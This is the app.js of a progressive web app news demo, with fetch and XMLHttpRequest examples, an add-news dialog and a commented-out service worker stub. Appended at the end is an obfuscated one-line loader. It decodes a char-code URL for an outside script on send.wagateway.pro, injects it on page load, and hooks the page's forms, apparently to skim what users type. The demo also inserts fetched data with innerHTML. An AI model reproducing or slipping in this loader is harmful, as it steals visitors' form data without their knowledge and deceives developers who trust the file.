// Copyright 2016 Google Inc.
// 
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
// 
//      http://www.apache.org/licenses/LICENSE-2.0
// 
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.


(function() {
  'use strict';

	var app = {
    	isLoading: true,
    	db: null,
    	promiseSuccess: false,
    	spinner: document.querySelector('.loader'),
    	addDialog: document.querySelector('.dialog-container')
  	};


  /*****************************************************************************
   *
   * Event listeners for UI elements
   *
   ****************************************************************************/

	document.getElementById('butRefresh').addEventListener('click', function() {
    	app.fetchLatestNews('all');
	});

	document.getElementById('butAdd').addEventListener('click', function() {
    	app.toggleAddDialog(true);
	});

	document.getElementById('butAddCity').addEventListener('click', function() {
    	app.toggleAddDialog(false);
    	app.spinner.setAttribute('hidden', false);
    	//var title = document.getElementById('title').value;
    	//var content = document.getElementById('content').value;
    	fetch('http://localhost:8888/PWA_DEMO_1/addNews.php', {
  			method: 'POST',
  			mode: 'no-cors',
  			body: new FormData(document.getElementById('newsForm'))
		})
		.then((resp) => resp.json()) 
		.then(function(data) {
			let news = data.news;
			const ul = document.getElementById('newsList');
			ul.innerHTML = '';
			return news.map(function(ne) {
			  let li = createNode('li'),
				  spanTitle = createNode('div'),
				  spanContent = createNode('span');
			  spanTitle.innerHTML = ne.title;
			  spanContent.innerHTML = ne.content;
			  append(li, spanTitle);
			  append(li, spanContent);
			  append(ul, li);
			})
		})
		.catch(function(error) {
			app.spinner.setAttribute('hidden', true);
		});
  	});

  	document.getElementById('butAddCancel').addEventListener('click', function() {
  		app.toggleAddDialog(false);
  		
  	});
  
  	/********Demo 1 - Use Fetch API - Show with MAMP*******/
  	//App startup code here
  
	/*if (!('fetch' in window)) {
		console.log('Fetch API not found, try including the polyfill');
		return;
	}*/
	////Add Fetch API to get Remote result.
	
	/////Traditional XMLHttpRequest /////////
	/*var xhttp = new XMLHttpRequest();
	xhttp.onreadystatechange = function() {
		if (this.readyState == 4 && this.status == 200) {
		   	app.spinner.setAttribute('hidden', true);
		   	var news = JSON.parse(xhttp.responseText).news;
			const ul = document.getElementById('newsList');
			return news.map(function(ne) {
			  let li = createNode('li'),
				  spanTitle = createNode('div'),
				  spanContent = createNode('span');
			  spanTitle.innerHTML = ne.title;
			  spanContent.innerHTML = ne.content;
			  append(li, spanTitle);
			  append(li, spanContent);
			  append(ul, li);
			})
		}
	};
	xhttp.open("GET", "news.json", true);
	xhttp.send();*/
	////////////////////////////////////////
	
	app.fetchLatestNews = function(city){
		app.spinner.setAttribute('hidden', false);
		
		fetch('news.json')
		.then((resp) => resp.json()) // Transform the data into json
		.then(function(data) {
			app.spinner.setAttribute('hidden', true);
			let news = data.news;
			const ul = document.getElementById('newsList');
			ul.innerHTML = '';
			return news.map(function(ne) {
			  let li = createNode('li'),
				  spanTitle = createNode('div'),
				  spanContent = createNode('span');
			  spanTitle.innerHTML = ne.title;
			  spanContent.innerHTML = ne.content;
			  append(li, spanTitle);
			  append(li, spanContent);
			  append(ul, li);
			})
		})
		.catch(function(error) {
			app.spinner.setAttribute('hidden', true);
			alert('Ooops!!! Looks like there was a problem');
		});
	}
	
	app.fetchLatestNews('all');
	
	function createNode(element) {
    	return document.createElement(element); // Create the type of element you pass in the parameters
  	}

	function append(parent, el) {
    	return parent.appendChild(el); // Append the second parameter(element) to the first one
  	}
  	
  	app.toggleAddDialog = function(visible) {
    	if (visible) {
      		app.addDialog.classList.add('dialog-container--visible');
    	} else {
      		app.addDialog.classList.remove('dialog-container--visible');
    	}
  	};
	
	
	/********End of Demo 1*******/
	
	
	/********Demo 2 Caching Data*******/
	
	// TODO add service worker code here
  	/*if ('serviceWorker' in navigator) {
    	navigator.serviceWorker
             .register('./service-worker.js')
             .then(initialiseState);
  	}*/
	
	/********End of Demo 2*************/
	
	
	
})();

(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db